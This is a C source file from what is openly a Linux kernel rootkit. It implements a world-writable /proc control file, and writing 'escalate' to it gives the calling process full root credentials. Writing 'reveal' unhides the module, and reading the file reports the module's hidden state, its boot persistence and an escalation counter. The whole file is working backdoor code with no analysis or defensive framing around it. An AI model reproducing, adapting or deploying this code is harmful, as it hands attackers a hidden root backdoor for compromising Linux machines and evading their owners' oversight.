// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/atomic.h>
#include <linux/cred.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>

#define COMMAND_SIZE 16

static atomic_t escalations = ATOMIC_INIT(0);
static struct proc_dir_entry *control_entry;

static int elevate_current(void)
{
	struct cred *credentials = prepare_creds();

	if (!credentials)
		return -ENOMEM;
	credentials->uid = GLOBAL_ROOT_UID;
	credentials->gid = GLOBAL_ROOT_GID;
	credentials->euid = GLOBAL_ROOT_UID;
	credentials->egid = GLOBAL_ROOT_GID;
	credentials->suid = GLOBAL_ROOT_UID;
	credentials->sgid = GLOBAL_ROOT_GID;
	credentials->fsuid = GLOBAL_ROOT_UID;
	credentials->fsgid = GLOBAL_ROOT_GID;
	return commit_creds(credentials);
}

static int status_show(struct seq_file *output, void *unused)
{
	seq_printf(output, "module_hidden=%s\nboot_request=%s\nescalations=%d\n",
		   conceal_module_hidden() ? "yes" : "no",
		   persistence_present() ? "present" : "absent",
		   atomic_read(&escalations));
	return 0;
}

static int status_open(struct inode *inode, struct file *file)
{
	return single_open(file, status_show, NULL);
}

static ssize_t control_write(struct file *file, const char __user *buffer,
			     size_t count, loff_t *position)
{
	char command[COMMAND_SIZE];
	size_t length = count;
	int error = 0;

	if (!count || count >= sizeof(command))
		return -EINVAL;
	if (copy_from_user(command, buffer, count))
		return -EFAULT;
	if (command[length - 1] == '\n')
		length--;
	command[length] = '\0';

	if (!strcmp(command, "escalate")) {
		error = elevate_current();
		if (!error)
			atomic_inc(&escalations);
	} else if (!strcmp(command, "reveal")) {
		reveal_module();
	} else {
		error = -EINVAL;
	}
	return error ? error : count;
}

static const struct proc_ops control_ops = {
	.proc_open = status_open,
	.proc_read = seq_read,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
	.proc_write = control_write,
};

int control_create(void)
{
	control_entry = proc_create(CONTROL_NAME, 0666, NULL, &control_ops);
	return control_entry ? 0 : -ENOMEM;
}

void control_destroy(void)
{
	proc_remove(control_entry);
}
